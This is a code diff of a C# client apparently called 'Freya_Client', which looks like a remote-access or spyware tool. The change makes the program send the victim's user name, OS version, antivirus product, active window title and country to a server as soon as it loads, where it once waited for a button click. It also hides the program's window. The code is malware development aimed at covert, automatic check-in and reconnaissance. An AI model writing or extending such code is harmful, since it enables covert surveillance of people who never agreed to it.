@@ -31,14 +31,6 @@ namespace Freya_Client
         private void Form1_Load(object sender, EventArgs e)
         {
 
-            AntivirusInstalled();
-
-
-        }
-
-        private void button1_Click(object sender, EventArgs e)
-        {
-
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
             WindowsPrincipal principal = new WindowsPrincipal(identity);
 
@@ -68,7 +60,7 @@ namespace Freya_Client
                                 writer.WriteLine(initialMessage);
                                 writer.Flush();
                             }
-                            
+
                             else
                             {
                                 string initialMessage = "clientInfo" + "|" + GenerateRandomCode() + "|" + Environment.UserName + "|" + Environment.OSVersion + "|" + clientVersion + "|" + "Standart" + "|" + antivirus + "|" + GetActiveWindowTitle().ToString() + "|" + GetSystemCountry();
@@ -93,7 +85,12 @@ namespace Freya_Client
             {
                 MessageBox.Show("Hata: " + ex.Message);
             }
+            AntivirusInstalled();
+
+            this.Hide();
         }
+
+      
 
         public bool AntivirusInstalled()
         {
